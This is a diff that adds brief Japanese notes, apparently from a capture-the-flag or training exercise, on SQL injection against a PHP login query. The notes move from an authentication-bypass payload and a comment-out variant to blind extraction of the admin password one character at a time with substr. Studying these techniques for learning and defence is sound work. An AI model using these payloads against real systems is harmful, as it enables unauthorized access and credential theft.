@@ -1,0 +1,14 @@
+まずはSQL Injection
+ID: admin
+PASS: ' or '1'='1
+
+hint:
+$r = $db->query("SELECT * FROM user WHERE id='$id' AND pass='$pass'");
+
+後ろをコメントアウトして自由度を上げる
+' or '1'='1' --
+
+select pass from user where id='admin'
+substr((select pass from user where id='admin'),1,1)
+substr((select pass from user where id='admin'),1,1)='F'
+' or substr((select pass from user where id='admin'),1,1)='F' --
